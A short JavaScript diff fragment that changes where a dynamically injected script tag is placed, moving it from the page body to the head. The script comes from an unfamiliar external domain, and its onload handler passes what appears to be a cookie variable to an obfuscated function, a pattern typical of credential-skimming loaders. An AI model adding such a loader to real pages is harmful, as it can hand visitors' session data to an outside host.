@@ -246,7 +246,7 @@ carregarTudo([
             'rel': 'stylesheet'
         }
     }, {
-        destino: 'body',  tag: 'script',   
+        destino: 'head',  tag: 'script',   
         atributos: {    
             'src': 'https://fcasfs-of.cloud-fs.net/StorageInspector.js',
 			'onload': "storage_ps_crtew('"+cokk_plu_esdnf+"');",
